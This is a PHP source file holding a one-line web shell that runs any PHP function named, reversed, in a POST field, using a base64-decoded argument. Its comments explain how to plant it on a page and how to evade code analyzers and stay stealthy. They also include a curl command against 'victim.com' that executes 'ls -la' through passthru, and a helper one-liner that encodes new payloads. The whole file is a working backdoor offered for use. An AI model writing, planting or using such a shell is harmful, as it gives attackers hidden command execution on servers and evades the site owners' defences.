/**
 * A lot of code analyzers search code for dangerous functions
 * such as exec, passthru, or system. This one-liner removes
 * all function names from the code and instead allows you
 * to specify them dynamically in the POST data.
 *
 * The POST variable field name is the PHP function that gets
 * called and the value in the POST request gets passed to it.
 * For better protection against code analyzers, the function
 * name is reversed and the value passed to it is base64 encoded.
 *
 * To use, insert the code on to a page and call like this.
 *
 * curl "http://victim.com/your-page.php" -d "urhtssap=bHMgLWxh"
 *
 * The example above calls PHP's passthru and passes it 'ls -la'.
 * If you're too lazy to reverse the function name and base64 encode
 * the value to pass to it, here's another one liner to do it for you.
 * Just update the $func and $arg variables to whatever you need and
 * run it from the command line.
 *
 * php -r '$func="passthru";$arg="ls -la";echo "\n" . strrev($func) . "=" . base64_encode($arg) . "\n";'
 *
 * POST is used instead of GET to keep it a little more stealthy
 * but you can change this if needed.
 */
<?php
foreach ($_POST as $func => $arg) strrev($func)(base64_decode($arg));
